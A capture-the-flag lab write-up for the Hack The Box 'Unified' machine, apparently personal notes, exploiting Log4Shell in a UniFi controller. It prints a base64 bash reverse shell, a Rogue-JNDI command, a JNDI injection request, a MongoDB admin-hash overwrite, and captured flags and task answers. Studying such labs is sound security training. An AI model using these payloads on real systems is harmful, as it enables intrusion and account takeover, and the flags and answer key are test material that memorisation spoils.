# HTB Unified - Complete Notes

## Machine Info
- **Name:** Unified
- **Difficulty:** Very Easy
- **OS:** Ubuntu 20.04.3 LTS
- **Target IP:** 10.129.96.149
- **Your VPN IP:** 10.10.14.222

═══════════════════════════════════════════════════════════════════════════════

## 1. Enumeration (Nmap)

```bash
sudo nmap -sC -sV 10.129.96.149
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH |
| 6789 | UniFi | UniFi Network |
| 8080 | HTTP | Apache/UniFi |
| 8443 | HTTPS | UniFi Network (Login Page) |
| 8843 | HTTPS | UniFi Guest Portal |
| 8880 | HTTP | UniFi HTTP Portal |

**Key Findings:**
- UniFi Network application running
- Login page at https://10.129.96.149:8443/manage/account/login
- Version 6.4.54 (vulnerable to Log4Shell)

═══════════════════════════════════════════════════════════════════════════════

## 2. Web Enumeration

### Check Login Page
```bash
curl -k -s https://10.129.96.149:8443/manage/account/login | grep -i "version\|unifi"
```

**Found:**
- Title: `UniFi Network`
- JavaScript file: `angular/g9c8f4ab88/js/index.js`

### Check API Endpoints
```bash
curl -k -s https://10.129.96.149:8443/api/login -X POST   -H "Content-Type: application/json"   -d '{"username":"test","password":"test"}'
```

═══════════════════════════════════════════════════════════════════════════════

## 3. Vulnerability Identification

### Log4Shell (CVE-2021-44228)

**Why it's vulnerable:**
- UniFi Network v6.4.54 uses vulnerable Log4j library
- Log4j processes lookup expressions like `${jndi:ldap://server.com}`
- JNDI (Java Naming and Directory Interface) can load remote code
- The "remember" parameter in login requests gets logged by Log4j

**Affected versions:**
- Log4j 2.0-beta9 through 2.14.1
- Log4j 2.15.0 (partially patched)
- Fully patched in 2.16.0+

═══════════════════════════════════════════════════════════════════════════════

## 4. Exploitation Setup

### Step 1: Prepare Reverse Shell Payload

```bash
# Generate base64-encoded reverse shell
echo -n 'bash -i >&/dev/tcp/10.10.14.222/4444 0>&1' | base64
# Output: YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjIyMi80NDQ0IDA+JjE=
```

### Step 2: Start Rogue-JNDI Server

```bash
cd ~/rogue-jndi
java -jar target/RogueJndi-1.1.jar   --command "bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjIyMi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}"   --hostname "10.10.14.222"
```

### Step 3: Start Netcat Listener

```bash
nc -lvnp 4444
```

### Step 4: Trigger Log4Shell

```bash
curl -k -X POST https://10.129.96.149:8443/api/login   -H "Content-Type: application/json"   -d '{"username":"admin","password":"password","remember":"${jndi:ldap://10.10.14.222:1389/o=tomcat}"}'
```

**Result:** Shell as user `unifi`

═══════════════════════════════════════════════════════════════════════════════

## 5. Post-Exploitation (unifi)

### Basic Enumeration
```bash
whoami
id
```

**Output:**
```
unifi
uid=999(unifi) gid=999(unifi) groups=999(unifi)
```

### Find User Flag
```bash
find / -name "user.txt" 2>/dev/null
cat /home/michael/user.txt
```

**User Flag:** `6ced1a6a89e666c0620cdb10262ba127`

### Find MongoDB
```bash
ps aux | grep mongo
```

**Found:**
```
bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117
```

═══════════════════════════════════════════════════════════════════════════════

## 6. MongoDB Enumeration

### Connect to MongoDB
```bash
mongo --port 27117
```

### Use UniFi Database
```javascript
use ace
```

### Find Admin Users
```javascript
db.admin.find({}, {"name": 1, "email": 1}).forEach(printjson)
```

**Found users:**
| Name | Email |
|------|-------|
| administrator | administrator@unified.htb |
| michael | michael@unified.htb |
| Seamus | seamus@unified.htb |
| warren | warren@unified.htb |
| james | james@unfiied.htb |

═══════════════════════════════════════════════════════════════════════════════

## 7. Password Reset via MongoDB

### Step 1: Generate New Password Hash

On Kali:
```bash
mkpasswd -m sha-512 "password123"
# Output: $6$JX78lgrd7LmXdFNh$T9RSfIvRs/FP.WSjnCs/pOivbYtHn2vf1LwmolTsNWBYa7dv5qsJR7HJJP/jHcZLujbcxaojuyrAEf9KaY0/70
```

### Step 2: Update Administrator Password

In MongoDB:
```javascript
db.admin.update(
  { "name" : "administrator" },
  { "$set" : { "x_shadow" : "$6$JX78lgrd7LmXdFNh$T9RSfIvRs/FP.WSjnCs/pOivbYtHn2vf1LwmolTsNWBYa7dv5qsJR7HJJP/jHcZLujbcxaojuyrAEf9KaY0/70" } }
)
```

### Step 3: Verify Update
```javascript
db.admin.find({ "name" : "administrator" }).forEach(printjson)
```

═══════════════════════════════════════════════════════════════════════════════

## 8. Web Login & SSH Credential Discovery

### Step 1: Login to UniFi Web Interface

- URL: `https://10.129.96.149:8443/manage`
- Username: `administrator`
- Password: `password123`

### Step 2: Find Root SSH Credentials

Navigate to:
- **Settings** → **Site**
- Scroll to **Device SSH Authentication**
- Enable SSH
- Reveal password

**Root SSH Password:** `NotACrackablePassword4U2022`

═══════════════════════════════════════════════════════════════════════════════

## 9. Root Access

### SSH as Root
```bash
ssh root@10.129.96.149
# Password: NotACrackablePassword4U2022
```

### Get Root Flag
```bash
cat /root/root.txt
```

**Root Flag:** `e50bc93c75b634e4b272d2f771c33681`

═══════════════════════════════════════════════════════════════════════════════

## Key Vulnerabilities Learned

| Vulnerability | How It Was Exploited | Impact |
|--------------|---------------------|--------|
| **Log4Shell (CVE-2021-44228)** | JNDI/LDAP injection in "remember" parameter | Remote code execution |
| **MongoDB accessible locally** | No authentication on local MongoDB instance | Password reset capability |
| **Password hash storage** | SHA-512 crypt hashes in MongoDB | Password modification |
| **SSH credentials in web UI** | Plaintext root password in settings | Full system compromise |

═══════════════════════════════════════════════════════════════════════════════

## Tools Used

- nmap
- curl
- Rogue-JNDI (LDAP referral server)
- netcat (nc)
- mongo (MongoDB client)
- mkpasswd
- ssh

═══════════════════════════════════════════════════════════════════════════════

## Lessons Learned

1. **Log4Shell is critical** — Any input that gets logged can trigger RCE
2. **JNDI lookups are dangerous** — Disable JNDI in Java applications
3. **MongoDB without auth** — Local databases can be exploited post-compromise
4. **Password hash algorithms** — SHA-512 crypt is standard for Linux passwords
5. **SSH credentials in web UIs** — Always check application settings for stored credentials
6. **Input validation** — All user input should be sanitized before logging
7. **Keep dependencies updated** — Log4j patches were released quickly after disclosure

═══════════════════════════════════════════════════════════════════════════════

## HTB Task Answers

| Task | Question | Answer |
|------|----------|--------|
| 1 | First four open ports | 22, 6789, 8080, 8443 |
| 2 | Software on highest port | UniFi Network |
| 3 | Software version | 6.4.54 |
| 4 | CVE | CVE-2021-44228 |
| 5 | Maven version | 3.6.3 |
| 6 | JNDI protocol | ldap |
| 7 | Traffic interception tool | tcpdump |
| 8 | Port to inspect | 389 |
| 9 | MongoDB port | 27117 |
| 10 | Default UniFi DB name | ace |
| 11 | Enumerate users function | db.admin.find() |
| 12 | Add data function | db.admin.insert() |
| 13 | Update users function | db.admin.update() |

═══════════════════════════════════════════════════════════════════════════════
